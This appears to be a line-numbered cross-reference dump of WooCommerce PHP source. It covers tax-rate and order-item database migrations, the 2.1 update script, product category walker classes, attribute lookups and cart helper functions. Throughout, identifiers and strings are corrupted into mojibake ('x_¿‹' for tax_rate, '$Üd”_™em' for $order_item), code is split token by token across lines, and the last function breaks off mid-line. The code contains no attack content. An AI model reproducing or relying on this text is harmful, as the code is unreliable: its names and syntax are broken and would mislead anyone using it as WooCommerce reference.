106 'x_¿‹_couÁry' => 
$couÁry
,

107 'x_¿‹_¡©e' => 
$¡©e
,

108 'x_¿‹' => 
$x_¿‹
['rate'],

109 'x_¿‹_Çme' => 
$x_¿‹
['label'],

111 'x_¿‹_compound' => 
$x_¿‹
['compound'] == 'yes' ? 1 : 0,

112 'x_¿‹_shpšg' => 
$x_¿‹
['shipping'] == 'yes' ? 1 : 0,

113 'x_¿‹_Üd”' => 
$loİ
,

114 'x_¿‹_şass' => 
$x_¿‹
['class']

118 
$loİ
++;

121 
	}
}

123 
	g$loÿl_x_¿‹s
 = 
g‘_İtiÚ
( 'woocommerce_local_tax_rates' );

125 iàĞ
	g$loÿl_x_¿‹s
 )

126 
	$fÜ—ch
 ( 
$loÿl_x_¿‹s
 
as
 
$x_¿‹
 ) {

128 
$loÿtiÚ_ty³
 = 
$x_¿‹
['location_type'] == 'postcode' ? 'postcode' : 'city';

130 iàĞ
$x_¿‹
['state'] == '*' )

131 
$x_¿‹
['state'] = '';

133 
$wpdb
->
	`š£¹
(

134 
$wpdb
->
´efix
 . "woocommerce_tax_rates",

135 
	`¬¿y
(

136 'x_¿‹_couÁry' => 
$x_¿‹
['country'],

137 'x_¿‹_¡©e' => 
$x_¿‹
['state'],

138 'x_¿‹' => 
$x_¿‹
['rate'],

139 'x_¿‹_Çme' => 
$x_¿‹
['label'],

141 'x_¿‹_compound' => 
$x_¿‹
['compound'] == 'yes' ? 1 : 0,

142 'x_¿‹_shpšg' => 
$x_¿‹
['shipping'] == 'yes' ? 1 : 0,

143 'x_¿‹_Üd”' => 
$loİ
,

144 'x_¿‹_şass' => 
$x_¿‹
['class']

148 
$x_¿‹_id
 = 
$wpdb
->
š£¹_id
;

150 iàĞ
$x_¿‹
['locations'] ) {

151 
	`fÜ—ch
 ( 
$x_¿‹
['loÿtiÚs'] 
as
 
$loÿtiÚ
 ) {

153 
$wpdb
->
	`š£¹
(

154 
$wpdb
->
´efix
 . "woocommerce_tax_rate_locations",

155 
	`¬¿y
(

156 'loÿtiÚ_code' => 
$loÿtiÚ
,

157 'x_¿‹_id' => 
$x_¿‹_id
,

158 'loÿtiÚ_ty³' => 
$loÿtiÚ_ty³
,

165 
$loİ
++;

166 
	}
}

168 
upd©e_İtiÚ
Ğ'woocomm”û_x_¿‹s_backup', 
$x_¿‹s
 );

169 
upd©e_İtiÚ
Ğ'woocomm”û_loÿl_x_¿‹s_backup', 
$loÿl_x_¿‹s
 );

170 
d–‘e_İtiÚ
( 'woocommerce_tax_rates' );

171 
d–‘e_İtiÚ
( 'woocommerce_local_tax_rates' );

176 
	g$Üd”_™em_rows
 = 
$wpdb
->
g‘_»suÉs
( "

177 
SELECT
 * 
FROM
 {
$wpdb
->
po¡m‘a
}

178 
WHERE
 
m‘a_key
 = '_order_items'

181 
	$fÜ—ch
 ( 
$Üd”_™em_rows
 
as
 
$Üd”_™em_row
 ) {

183 
$Üd”_™ems
 = (
¬¿y
è
	`maybe_un£rŸlize
Ğ
$Üd”_™em_row
->
m‘a_v®ue
 );

185 
	`fÜ—ch
 ( 
$Üd”_™ems
 
as
 
$Üd”_™em
 ) {

187 iàĞ! 
	`is£t
Ğ
$Üd”_™em
['line_total'] ) && isset( $order_item['taxrate'] ) && isset( $order_item['cost'] ) ) {

188 
$Üd”_™em
['lše_x'] = 
	`numb”_fÜm©
( ( $order_item['cost'] * $order_item['qty'] ) * ( $order_item['taxrate'] / 100 ), 2, '.', '' );

189 
$Üd”_™em
['line_total'] = $order_item['cost'] * $order_item['qty'];

190 
$Üd”_™em
['line_subtotal_tax'] = $order_item['line_tax'];

191 
$Üd”_™em
['line_subtotal'] = $order_item['line_total'];

194 
$Üd”_™em
['lše_x'] = 
	`is£t
( $order_item['line_tax'] ) ? $order_item['line_tax'] : 0;

195 
$Üd”_™em
['lše_tÙ®'] = 
	`is£t
( $order_item['line_total'] ) ? $order_item['line_total'] : 0;

196 
$Üd”_™em
['lše_subtÙ®_x'] = 
	`is£t
( $order_item['line_subtotal_tax'] ) ? $order_item['line_subtotal_tax'] : 0;

197 
$Üd”_™em
['lše_subtÙ®'] = 
	`is£t
( $order_item['line_subtotal'] ) ? $order_item['line_subtotal'] : 0;

199 
$™em_id
 = 
	`wc_add_Üd”_™em
Ğ
$Üd”_™em_row
->
po¡_id
, 
	`¬¿y
(

200 'Üd”_™em_Çme' => 
$Üd”_™em
['name'],

205 iàĞ
$™em_id
 ) {

206 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_qty', 
	`absšt
Ğ
$Üd”_™em
['qty'] ) );

207 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_x_şass', 
$Üd”_™em
['tax_class'] );

208 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_´oduù_id', 
$Üd”_™em
['id'] );

209 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_v¬ŸtiÚ_id', 
$Üd”_™em
['variation_id'] );

210 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_lše_subtÙ®', 
	`wc_fÜm©_decim®
Ğ
$Üd”_™em
['line_subtotal'] ) );

211 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_lše_subtÙ®_x', 
	`wc_fÜm©_decim®
Ğ
$Üd”_™em
['line_subtotal_tax'] ) );

212 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_lše_tÙ®', 
	`wc_fÜm©_decim®
Ğ
$Üd”_™em
['line_total'] ) );

213 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_lše_x', 
	`wc_fÜm©_decim®
Ğ
$Üd”_™em
['line_tax'] ) );

215 
$m‘a_rows
 = 
	`¬¿y
();

218 iàĞ! 
	`em±y
Ğ
$Üd”_™em
['item_meta'] ) ) {

219 
	`fÜ—ch
 ( 
$Üd”_™em
['™em_m‘a'] 
as
 
$key
 => 
$m‘a
 ) {

221 iàĞ
	`is_¬¿y
Ğ
$m‘a
 ) && 
	`is£t
( $meta['meta_name'] ) ) {

222 
$m‘a_rows
[] = '(' . 
$™em_id
 . ',"' . 
	`esc_sql
Ğ
$m‘a
['meta_name'] ) . '","' .ƒsc_sql( $meta['meta_value'] ) . '")';

224 
$m‘a_rows
[] = '(' . 
$™em_id
 . ',"' . 
	`esc_sql
Ğ
$key
 ) . '","' .ƒsc_sqlĞ
$m‘a
 ) . '")';

230 iàĞĞ
$m‘a_rows
 ) > 0 ) {

231 
$wpdb
->
	`qu”y
Ğ$wpdb->
	`´•¬e
( "

232 
INSERT
 
INTO
 {
$wpdb
->
´efix
}
	`woocomm”û_Üd”_™emm‘a
 ( 
Üd”_™em_id
, 
m‘a_key
, 
m‘a_v®ue
 )

233 
VALUES
 " . implode( ',', $meta_rows ) . ";

238 
$wpdb
->
	`qu”y
Ğ$wpdb->
	`´•¬e
( "

239 
UPDATE
 {
$wpdb
->
po¡m‘a
}

240 
SET
 
m‘a_key
 = '_order_items_old'

241 
WHERE
 
m‘a_key
 = '_order_items'

242 
AND
 
po¡_id
 = %
d


246 
	`un£t
Ğ
$m‘a_rows
, 
$™em_id
, 
$Üd”_™em
 );

248 
	}
}

252 
$Üd”_x_rows
 = 
$wpdb
->
g‘_»suÉs
( "

253 
SELECT
 * 
FROM
 {
$wpdb
->
po¡m‘a
}

254 
WHERE
 
m‘a_key
 = '_order_taxes'

257 
	$fÜ—ch
 ( 
$Üd”_x_rows
 
as
 
$Üd”_x_row
 ) {

259 
$Üd”_xes
 = (
¬¿y
è
	`maybe_un£rŸlize
Ğ
$Üd”_x_row
->
m‘a_v®ue
 );

261 iàĞ
$Üd”_xes
 ) {

262 
	`fÜ—ch
Ğ
$Üd”_xes
 
as
 
$Üd”_x
 ) {

264 iàĞ! 
	`is£t
Ğ
$Üd”_x
['label'] ) || ! isset( $order_tax['cart_tax'] ) || ! isset( $order_tax['shipping_tax'] ) )

267 
$™em_id
 = 
	`wc_add_Üd”_™em
Ğ
$Üd”_x_row
->
po¡_id
, 
	`¬¿y
(

268 'Üd”_™em_Çme' => 
$Üd”_x
['label'],

273 iàĞ
$™em_id
 ) {

274 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, 'compound', 
	`absšt
Ğ
	`is£t
Ğ
$Üd”_x
['compound'] ) ? $order_tax['compound'] : 0 ) );

275 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, 'x_amouÁ', 
	`wc_ş—n
Ğ
$Üd”_x
['cart_tax'] ) );

276 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, 'shpšg_x_amouÁ', 
	`wc_ş—n
Ğ
$Üd”_x
['shipping_tax'] ) );

280 
$wpdb
->
	`qu”y
Ğ$wpdb->
	`´•¬e
( "

281 
UPDATE
 {
$wpdb
->
po¡m‘a
}

282 
SET
 
m‘a_key
 = '_order_taxes_old'

283 
WHERE
 
m‘a_key
 = '_order_taxes'

284 
AND
 
po¡_id
 = %
d


287 
	`un£t
Ğ
$x_amouÁ
 );

290 
	}
}

295 
fÜ—ch
 ( 
¬¿y
Ğ'ÿlog', 'sšgË', 'thumbÇ' ) 
as
 
$v®ue
 ) {

297 
$Şd_£‰šgs
 = 
¬¿y_f‹r
Ğ
¬¿y
(

298 'width' => 
g‘_İtiÚ
Ğ'woocomm”û_' . 
$v®ue
 . '_image_width' ),

299 'height' => 
g‘_İtiÚ
Ğ'woocomm”û_' . 
$v®ue
 . '_image_height' ),

300 'üİ' => 
g‘_İtiÚ
Ğ'woocomm”û_' . 
$v®ue
 . '_image_crop' )

303 iàĞ! 
em±y
Ğ
$Şd_£‰šgs
 ) && 
upd©e_İtiÚ
Ğ'shİ_' . 
$v®ue
 . '_image_size', $old_settings ) ){

305 
d–‘e_İtiÚ
Ğ'woocomm”û_' . 
$v®ue
 . '_image_width' );

306 
d–‘e_İtiÚ
Ğ'woocomm”û_' . 
$v®ue
 . '_image_height' );

307 
d–‘e_İtiÚ
Ğ'woocomm”û_' . 
$v®ue
 . '_image_crop' );

	@includes/updates/woocommerce-update-2.1.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 
glob®
 
	g$wpdb
, 
	g$woocomm”û
;

16 
wp_Œash_po¡
Ğ
g‘_İtiÚ
('woocommerce_pay_page_id') );

17 
wp_Œash_po¡
Ğ
g‘_İtiÚ
('woocommerce_thanks_page_id') );

18 
wp_Œash_po¡
Ğ
g‘_İtiÚ
('woocommerce_view_order_page_id') );

19 
wp_Œash_po¡
Ğ
g‘_İtiÚ
('woocommerce_change_password_page_id') );

20 
wp_Œash_po¡
Ğ
g‘_İtiÚ
('woocommerce_edit_address_page_id') );

21 
wp_Œash_po¡
Ğ
g‘_İtiÚ
('woocommerce_lost_password_page_id') );

24 
	g$exi¡šg_fe_·ths
 = 
$wpdb
->
g‘_»suÉs
( "SELECT * FROM {$wpdb->postmeta} WHERE meta_key = '_file_paths' AND meta_value != '';" );

26 iàĞ
	g$exi¡šg_fe_·ths
 ) {

28 
fÜ—ch
Ğ
$exi¡šg_fe_·ths
 
as
 
$exi¡šg_fe_·th
 ) {

30 
	g$Ãeds_upd©e
 = 
çl£
;

31 
	g$Ãw_v®ue
 = 
¬¿y
();

32 
	g$v®ue
 = 
maybe_un£rŸlize
Ğ
Œim
Ğ
$exi¡šg_fe_·th
->
m‘a_v®ue
 ) );

34 iàĞ
	g$v®ue
 ) {

35 
fÜ—ch
 ( 
$v®ue
 
as
 
$key
 => 
$fe
 ) {

36 iàĞ! 
is_¬¿y
Ğ
$fe
 ) ) {

37 
$Ãeds_upd©e
 = 
Œue
;

38 
	g$Ãw_v®ue
[ 
$key
 ] = 
¬¿y
(

39 'fe' => 
$fe
,

40 'Çme' => 
wc_g‘_f’ame_äom_u¾
Ğ
$fe
 )

43 
	g$Ãw_v®ue
[ 
$key
 ] = 
$fe
;

46 iàĞ
	g$Ãeds_upd©e
 ) {

47 
	g$Ãw_v®ue
 = 
£rŸlize
Ğ
$Ãw_v®ue
 );

49 
	g$wpdb
->
qu”y
Ğ
$wpdb
->
´•¬e
Ğ"UPDATE {$wpdb->po¡m‘a} SET m‘a_key = %s, m‘a_v®uğ% WHERE m‘a_id = %d", '_dowÆßdabË_fes', 
$Ãw_v®ue
, 
$exi¡šg_fe_·th
->
m‘a_id
 ) );

	@includes/walkers/class-product-cat-dropdown-walker.php

1 <?
php


12 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

14 şas 
	cWC_Produù_C©_Drİdown_W®k”
 
ex‹nds
 
	mW®k”
 {

16 
v¬
 
	m$Œ“_ty³
 = 'category';

17 
v¬
 
	m$db_f›lds
 = 
¬¿y
 ('parent' => 'parent', 'id' => 'term_id', 'slug' => 'slug' );

28 
public
 
funùiÚ
 
¡¬t_–
Ğ&
$ouut
, 
$ÿt
, 
$d•th
 = 0, 
$¬gs
 = 
¬¿y
(), 
$cu¼’t_objeù_id
 = 0 ) {

30 iàĞ! 
em±y
Ğ
$¬gs
['hierarchical'] ) )

31 
$·d
 = 
¡r_»³©
('&nb¥;', 
$d•th
 * 3);

33 
	m$·d
 = '';

35 
	m$ÿt_Çme
 = 
­¶y_f‹rs
Ğ'li¡_´oduù_ÿts', 
$ÿt
->
Çme
, $cat );

37 
	m$v®ue
 = 
is£t
Ğ
$¬gs
['v®ue'] ) && $¬gs['v®ue'] =ğ'id' ? 
$ÿt
->
‹rm_id
 : $ÿt->
¦ug
;

39 
	m$ouut
 .ğ"\t<İtiÚ cÏss=\"Ëv–-$d•th\" v®ue=\"" . 
$v®ue
 . "\"";

41 iàĞ
	m$v®ue
 =ğ
$¬gs
['£Ëùed'] || ( 
is_¬¿y
Ğ$¬gs['£Ëùed'] ) && 
š_¬¿y
Ğ
$v®ue
, $args['selected'] ) ) )

42 
	m$ouut
 .= ' selected="selected"';

44 
	m$ouut
 .= '>';

46 
	m$ouut
 .ğ
$·d
 . 
__
Ğ
$ÿt_Çme
, 'woocommerce' );

48 iàĞ! 
em±y
Ğ
$¬gs
['show_count'] ) )

49 
	m$ouut
 .ğ'&nb¥;(' . 
$ÿt
->
couÁ
 . ')';

51 
	m$ouut
 .= "</option>\n";

74 
public
 
funùiÚ
 
	$di¥Ïy_–em’t
Ğ
$–em’t
, &
$chd»n_–em’ts
, 
$max_d•th
, 
$d•th
 = 0, 
$¬gs
, &
$ouut
 ) {

75 iàĞ! 
$–em’t
 || 0 ==ğ$–em’t->
couÁ
 ) {

78 
·»Á
::
	`di¥Ïy_–em’t
Ğ
$–em’t
, 
$chd»n_–em’ts
, 
$max_d•th
, 
$d•th
, 
$¬gs
, 
$ouut
 );

79 
	}
}

	@includes/walkers/class-product-cat-list-walker.php

1 <?
php


12 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

14 şas 
	cWC_Produù_C©_Li¡_W®k”
 
ex‹nds
 
	mW®k”
 {

16 
v¬
 
	m$Œ“_ty³
 = 'product_cat';

17 
v¬
 
	m$db_f›lds
 = 
¬¿y
 ( 'parent' => 'parent', 'id' => 'term_id', 'slug' => 'slug' );

27 
public
 
funùiÚ
 
¡¬t_lvl
Ğ&
$ouut
, 
$d•th
 = 0, 
$¬gs
 = 
	$¬¿y
() ) {

28 iàĞ'li¡' !ğ
$¬gs
['style'] )

31 
$šd’t
 = 
	`¡r_»³©
("\t", 
$d•th
);

32 
$ouut
 .= "$indent<ul class='children'>\n";

43 
public
 
funùiÚ
 
	`’d_lvl
Ğ&
$ouut
, 
$d•th
 = 0, 
$¬gs
 = 
	$¬¿y
() ) {

44 iàĞ'li¡' !ğ
$¬gs
['style'] )

47 
$šd’t
 = 
	`¡r_»³©
("\t", 
$d•th
);

48 
$ouut
 .= "$indent</ul>\n";

49 
	}
}

60 
public
 
funùiÚ
 
¡¬t_–
Ğ&
$ouut
, 
$ÿt
, 
$d•th
 = 0, 
$¬gs
 = 
¬¿y
(), 
$cu¼’t_objeù_id
 = 0 ) {

61 
$ouut
 .ğ'<l˜şass="ÿt-™em c©-™em-' . 
$ÿt
->
‹rm_id
;

63 iàĞ
	g$¬gs
['cu¼’t_ÿ‹gÜy'] =ğ
$ÿt
->
‹rm_id
 ) {

64 
$ouut
 .= ' current-cat';

67 iàĞ
	g$¬gs
['has_children'] && $args['hierarchical'] ) {

68 
	g$ouut
 .= ' cat-parent';

71 iàĞ
	g$¬gs
['cu¼’t_ÿ‹gÜy_ªû¡Üs'] && $¬gs['cu¼’t_ÿ‹gÜy'] && 
š_¬¿y
Ğ
$ÿt
->
‹rm_id
, 
$¬gs
['current_category_ancestors'] ) ) {

72 
	g$ouut
 .= ' current-cat-parent';

75 
	g$ouut
 .ğ'"><¨h»f="' . 
g‘_‹rm_lšk
Ğ(è
$ÿt
->
‹rm_id
, '´oduù_ÿt' ) . '">' . 
__
Ğ$ÿt->
Çme
, 'woocommerce' ) . '</a>';

77 iàĞ
	g$¬gs
['show_count'] ) {

78 
	g$ouut
 .ğ' <¥ª cÏss="couÁ">(' . 
$ÿt
->
couÁ
 . ')</span>';

91 
public
 
funùiÚ
 
’d_–
Ğ&
$ouut
, 
$ÿt
, 
$d•th
 = 0, 
$¬gs
 = 
	$¬¿y
() ) {

92 
$ouut
 .= "</li>\n";

93 
	}
}

115 
public
 
funùiÚ
 
	$di¥Ïy_–em’t
Ğ
$–em’t
, &
$chd»n_–em’ts
, 
$max_d•th
, 
$d•th
 = 0, 
$¬gs
, &
$ouut
 ) {

116 iàĞ! 
$–em’t
 || 0 ==ğ$–em’t->
couÁ
 ) {

119 
·»Á
::
	`di¥Ïy_–em’t
Ğ
$–em’t
, 
$chd»n_–em’ts
, 
$max_d•th
, 
$d•th
, 
$¬gs
, 
$ouut
 );

120 
	}
}

	@includes/wc-attribute-functions.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

18 
funùiÚ
 
	$wc_g‘_©Œibu‹_xÚom›s
() {

20 
$Œªs›Á_Çme
 = 'wc_attribute_taxonomies';

22 iàĞ
çl£
 ==ğĞ
$©Œibu‹_xÚom›s
 = 
	`g‘_Œªs›Á
Ğ
$Œªs›Á_Çme
 ) ) ) {

24 
glob®
 
$wpdb
;

26 
$©Œibu‹_xÚom›s
 = 
$wpdb
->
	`g‘_»suÉs
Ğ"SELECT * FROM " . $wpdb->
´efix
 . "woocommerce_attribute_taxonomies" );

28 
	`£t_Œªs›Á
Ğ
$Œªs›Á_Çme
, 
$©Œibu‹_xÚom›s
 );

31  
	`­¶y_f‹rs
Ğ'woocomm”û_©Œibu‹_xÚom›s', 
$©Œibu‹_xÚom›s
 );

32 
	}
}

40 
funùiÚ
 
	$wc_©Œibu‹_xÚomy_Çme
Ğ
$Çme
 ) {

41  '·_' . 
	`wc_§n™ize_xÚomy_Çme
Ğ
$Çme
 );

42 
	}
}

50 
funùiÚ
 
	$wc_©Œibu‹_Ïb–
Ğ
$Çme
 ) {

51 
glob®
 
$wpdb
;

53 iàĞ
	`xÚomy_is_´oduù_©Œibu‹
Ğ
$Çme
 ) ) {

54 
$Çme
 = 
	`wc_§n™ize_xÚomy_Çme
Ğ
	`¡r_»¶aû
( 'pa_', '', $name ) );

56 
$Ïb–
 = 
$wpdb
->
	`g‘_v¬
Ğ$wpdb->
	`´•¬e
Ğ"SELECT‡‰ribu‹_Ïb– FROM {$wpdb->´efix}woocomm”û_©Œibu‹_xÚom› WHERE‡‰ribu‹_Çmğ%s;", 
$Çme
 ) );

58 iàĞ! 
$Ïb–
 ) {

59 
$Ïb–
 = 
	`ucfœ¡
Ğ
$Çme
 );

62 
$Ïb–
 = 
$Çme
;

65  
	`­¶y_f‹rs
Ğ'woocomm”û_©Œibu‹_Ïb–', 
$Ïb–
, 
$Çme
 );

66 
	}
}

74 
funùiÚ
 
	$wc_©Œibu‹_Üd”by
Ğ
$Çme
 ) {

75 
glob®
 
$wpdb
;

77 
$Çme
 = 
	`¡r_»¶aû
Ğ'·_', '', 
	`§n™ize_t™Ë
( $name ) );

79 
$Üd”by
 = 
$wpdb
->
	`g‘_v¬
Ğ$wpdb->
	`´•¬e
Ğ"SELECT‡‰ribu‹_Üd”by FROM " . $wpdb->
´efix
 . "woocomm”û_©Œibu‹_xÚom› WHERE‡‰ribu‹_Çmğ%s;", 
$Çme
 ) );

81  
	`­¶y_f‹rs
Ğ'woocomm”û_©Œibu‹_Üd”by', 
$Üd”by
, 
$Çme
 );

82 
	}
}

90 
funùiÚ
 
	$wc_g‘_©Œibu‹_xÚomy_Çmes
() {

91 
$xÚomy_Çmes
 = 
	`¬¿y
();

92 
$©Œibu‹_xÚom›s
 = 
	`wc_g‘_©Œibu‹_xÚom›s
();

93 iàĞ
$©Œibu‹_xÚom›s
 ) {

94 
	`fÜ—ch
 ( 
$©Œibu‹_xÚom›s
 
as
 
$x
 ) {

95 
$xÚomy_Çmes
[] = 
	`wc_©Œibu‹_xÚomy_Çme
Ğ
$x
->
©Œibu‹_Çme
 );

98  
$xÚomy_Çmes
;

99 
	}
}

	@includes/wc-cart-functions.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

22 
funùiÚ
 
	$wc_´Ùeùed_´oduù_add_to_ÿ¹
Ğ
$·s£d
, 
$´oduù_id
 ) {

23 iàĞ
	`po¡_·sswÜd_»quœed
Ğ
$´oduù_id
 ) ) {

24 
$·s£d
 = 
çl£
;

25 
	`wc_add_nÙiû
Ğ
	`__
( 'This…roduct is…rotected‡nd cannot be…urchased.', 'woocommerce' ), 'error' );

27  
$·s£d
;

28 
	}
}

29 
add_f‹r
( 'woocommerce_add_to_cart_validation', 'wc_protected_product_add_to_cart', 10, 2 );

36 
funùiÚ
 
	$wc_em±y_ÿ¹
() {

37 iàĞ! 
	`is£t
Ğ
	`WC
()->
ÿ¹
 ) || WC()->cart == '' )

38 
	`WC
()->
ÿ¹
 = 
Ãw
 
	`WC_C¬t
();

40 
	`WC
()->
ÿ¹
->
	`em±y_ÿ¹
Ğ
çl£
 );

41 
	}
}

42 
add_aùiÚ
( 'wp_logout', 'wc_empty_cart' );

52 
funùiÚ
 
	$wc_lßd_³rsi¡’t_ÿ¹
Ğ
$u£r_logš
, 
$u£r
 = 0 ) {

54 iàĞ! 
$u£r
 )

57 
$§ved_ÿ¹
 = 
	`g‘_u£r_m‘a
Ğ
$u£r
->
ID
, '_woocomm”û_³rsi¡’t_ÿ¹', 
Œue
 );

59 iàĞ
$§ved_ÿ¹
 )

60 iàĞ
	`em±y
Ğ
	`WC
()->
£ssiÚ
->
ÿ¹
 ) || ! 
	`is_¬¿y
( WC()->session->cart ) || ( WC()->session->cart ) == 0 )

61 
	`WC
()->
£ssiÚ
->
ÿ¹
 = 
$§ved_ÿ¹
['cart'];

62 
	}
}

63 
add_aùiÚ
( 'wp_login', 'wc_load_persistent_cart', 1, 2 );

73 
funùiÚ
 
	$wc_add_to_ÿ¹_mes§ge
Ğ
$´oduù_id
 ) {

75 iàĞ
	`is_¬¿y
Ğ
$´oduù_id
 ) ) {

77 
$t™Ës
 = 
	`¬¿y
();

79 
	`fÜ—ch
 ( 
$´oduù_id
 
as
 
$id
 ) {

80 
$t™Ës
[] = 
	`g‘_the_t™Ë
Ğ
$id
 );

83 
$added_‹xt
 = 
	`¥rštf
Ğ
	`__
Ğ'Added &quÙ;%s&quÙ;Øyou¸ÿ¹.', 'woocomm”û' ), 
	`još
Ğ__Ğ'&quÙ;‡nd &quÙ;', 'woocomm”û' ), 
	`¬¿y_f‹r
Ğ
	`¬¿y_m”ge
Ğ
	`¬¿y
ĞjošĞ'&quÙ;, &quÙ;', 
	`¬¿y_¦iû
Ğ
$t™Ës
, 0, -1 ) ) ),‡rray_slice( $titles, -1 ) ) ) ) );

86 
$added_‹xt
 = 
	`¥rštf
Ğ
	`__
Ğ'&quÙ;%s&quÙ; wa sucûssfuÎy‡ddedØyou¸ÿ¹.', 'woocomm”û' ), 
	`g‘_the_t™Ë
Ğ
$´oduù_id
 ) );

90 iàĞ
	`g‘_İtiÚ
( 'woocommerce_cart_redirect_after_add' ) == 'yes' ) :

92 
$»tuº_to
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_cÚtšue_shİpšg_»dœeù', 
	`wp_g‘_»ã»r
(è? wp_g‘_»ã»r(è: 
	`home_u¾
() );

94 
$mes§ge
 = 
	`¥rštf
('<¨h»f="%s" cÏss="bu‰Ú wc-fÜw¬d">%s</a> %s', 
$»tuº_to
, 
	`__
Ğ'CÚtšuShİpšg', 'woocomm”û' ), 
$added_‹xt
 );

98 
$mes§ge
 = 
	`¥rštf
('<¨h»f="%s" cÏss="bu‰Ú wc-fÜw¬d">%s</a> %s', 
	`g‘_³rm®šk
Ğ
	`wc_g‘_·ge_id
Ğ'ÿ¹' ) ), 
	`__
Ğ'V›w C¬t', 'woocomm”û' ), 
$added_‹xt
 );

100 
’dif
;

102 
	`wc_add_nÙiû
Ğ
	`­¶y_f‹rs
Ğ'wc_add_to_ÿ¹_mes§ge', 
$mes§ge
, 
$´oduù_id
 ) );

103 
	}
}

111 
funùiÚ
 
	$wc_ş—r_ÿ¹_aá”_·ym’t
() {

112 
glob®
 
$wp
;

114 iàĞ! 
	`em±y
Ğ
$wp
->
qu”y_v¬s
['order-received'] ) ) {

116 
$Üd”_id
 = 
	`absšt
Ğ
$wp
->
qu”y_v¬s
['order-received'] );

118 iàĞ
	`is£t
Ğ
$_GET
['key'] ) )

119 
$Üd”_key
 = 
$_GET
['key'];

121 
$Üd”_key
 = '';

123 iàĞ
$Üd”_id
 > 0 ) {

124 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

126 iàĞ
$Üd”
->
Üd”_key
 =ğ
$Üd”_key
 ) {

127 
	`WC
()->
ÿ¹
->
	`em±y_ÿ¹
();

133 iàĞ
	`WC
()->
£ssiÚ
->
Üd”_awa™šg_·ym’t
 > 0 ) {

135 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
	`WC
()->
£ssiÚ
->
Üd”_awa™šg_·ym’t
 );

137 iàĞ
$Üd”
->
id
 > 0 ) {

139 iàĞ
$Üd”
->
¡©us
 != 'failed' && $order->status != 'pending' )

140 
	`WC
()->
ÿ¹
->
	`em±y_ÿ¹
();

143 
	}
}

144 
add_aùiÚ
( 'get_header', 'wc_clear_cart_after_payment' );

152 
funùiÚ
 
	$wc_ÿ¹_tÙ®s_subtÙ®_html
() {

153 
echo
 
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹_subtÙ®
();

154 
	}
}

162 
funùiÚ
 
	$wc_ÿ¹_tÙ®s_shpšg_html
() {

163 
$·ckages
 = 
	`WC
()->
shpšg
->
	`g‘_·ckages
();

165 
	`fÜ—ch
 ( 
$·ckages
 
as
 
$i
 => 
$·ckage
 ) {

166 
$cho£n_m‘hod
 = 
	`is£t
Ğ
	`WC
()->
£ssiÚ
->
cho£n_shpšg_m‘hods
[ 
$i
 ] ) ? WC()->session->chosen_shipping_methods[ $i ] : '';

168 
	`wc_g‘_‹m¶©e
Ğ'ÿ¹/ÿ¹-shpšg.php', 
	`¬¿y
Ğ'·ckage' => 
$·ckage
, 'avaabË_m‘hods' => $·ckage['¿‹s'], 'show_·ckage_d‘as' => ( Ğ
$·ckages
 ) > 1 ), 'šdex' => 
$i
, 'cho£n_m‘hod' => 
$cho£n_m‘hod
 ) );

170 
	}
}

178 
funùiÚ
 
	$wc_ÿ¹_tÙ®s_xes_tÙ®_html
() {

179 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_tÙ®s_xes_tÙ®_html', 
	`wc_´iû
Ğ
	`WC
()->
ÿ¹
->
	`g‘_xes_tÙ®
() ) );

180 
	}
}

189 
funùiÚ
 
	$wc_ÿ¹_tÙ®s_coupÚ_Ïb–
Ğ
$coupÚ
 ) {

190 iàĞ
	`is_¡ršg
Ğ
$coupÚ
 ) )

191 
$coupÚ
 = 
Ãw
 
	`WC_CoupÚ
( $coupon );

193 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_tÙ®s_coupÚ_Ïb–', 
	`esc_html
Ğ
	`__
Ğ'CoupÚ:', 'woocomm”û' ) . ' ' . 
$coupÚ
->
code
 ), $coupon );

194 
	}
}

203 
funùiÚ
 
	$wc_ÿ¹_tÙ®s_coupÚ_html
Ğ
$coupÚ
 ) {

204 iàĞ
	`is_¡ršg
Ğ
$coupÚ
 ) ) {

205 
$coupÚ
 = 
Ãw
 
	`WC_CoupÚ
( $coupon );

208 
$v®ue
 = 
	`¬¿y
();

210 iàĞ! 
	`em±y
Ğ
	`WC
()->
ÿ¹
->
coupÚ_discouÁ_amouÁs
[ 
$coupÚ
->
code
 ] ) ) {

211 
$discouÁ_html
 = '-' . 
	`wc_´iû
Ğ
	`WC
()->
ÿ¹
->
coupÚ_discouÁ_amouÁs
[ 
$coupÚ
->
code
 ] );

213 
$discouÁ_html
 = '';

216 
$v®ue
[] = 
	`­¶y_f‹rs
Ğ'woocomm”û_coupÚ_discouÁ_amouÁ_html', 
$discouÁ_html
, 
$coupÚ
 );

218 iàĞ
$coupÚ
->
	`’abË_ä“_shpšg
() ) {

219 
$v®ue
[] = 
	`__
( 'Free shipping coupon', 'woocommerce' );

223 
$v®ue
 = 
	`¬¿y_f‹r
( $value );

225 
$v®ue
 = 
	`im¶ode
Ğ', ', $v®uè. ' <¨h»f="' . 
	`add_qu”y_¬g
Ğ'»move_coupÚ', 
$coupÚ
->
code
, 
	`defšed
Ğ'WOOCOMMERCE_CHECKOUT' ) ? 
	`WC
()->
ÿ¹
->
	`g‘_checkout_u¾
(è: WC()->ÿ¹->
	`g‘_ÿ¹_u¾
